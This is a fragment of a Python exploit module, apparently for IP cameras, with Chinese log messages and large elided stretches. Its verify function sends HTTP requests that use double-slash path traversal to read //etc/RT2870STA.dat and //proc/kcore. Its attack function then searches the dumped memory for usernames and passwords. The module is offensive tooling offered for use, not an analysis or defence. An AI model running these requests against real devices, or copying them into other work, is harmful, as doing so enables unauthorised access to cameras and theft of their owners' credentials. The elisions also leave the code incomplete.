...
from core.utils import WEAK_LEVEL
...
def mode_verify(logger):
    def _verify(dev):
        ip = dev["ip_addr"]
        logger.info(u"获取地址为%s的主机的信息。。。" % ip)

        try:
            resp = urlopen("http://%s/get_status.cgi" % ip, timeout=20).read().decode("utf-8")
        ...
        try:
            resp = urlopen("http://%s//etc/RT2870STA.dat" % ip, timeout=20).read().decode("utf-8")
        except (HTTPError, URLError):
        ...
        try:
            urlopen("http://%s//proc/kcore" % ip, timeout=20)
    ...
    def _attack(dev):
        ...
        while True:
            ...
            # some may be b'ipcamera_006E0606CA89'
                ...
                logger.info("在内存文件中未找到用户名密码，共检查%s行\n" % count)
                return True
    return _attack
